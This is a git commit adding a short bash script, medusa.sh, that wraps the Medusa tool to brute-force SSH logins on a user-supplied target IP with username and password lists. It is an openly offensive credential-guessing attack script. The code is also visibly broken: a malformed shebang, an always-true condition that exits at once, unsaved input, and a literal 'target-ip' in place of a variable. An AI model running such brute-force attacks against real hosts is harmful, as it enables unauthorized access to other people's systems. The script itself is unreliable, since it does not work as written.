10f4213471d177f57dbbac991514d334b4d38b1a
choncey <nchoncey@gmail.com>
2023-12-22 11:35:55 -0800

    made medusa bash script

---
+++ medusa.sh
@@ -0,0 +1,18 @@
+#!bin/bash
+
+# Prompt user a question
+read -p "Do you know what you're doing?"
+
+# Check reponse of user
+if [ "question"="y" ]; then
+
+	echo -read "I hope so. You're going to jail if you don't"
+	exit
+fi
+
+# Prompt user for input
+read -p "What is your target ip?"
+
+
+# Run this commands with the target_ip provided
+medusa -h "target-ip" -U usernames.txt -P password_list.txt -M ssh
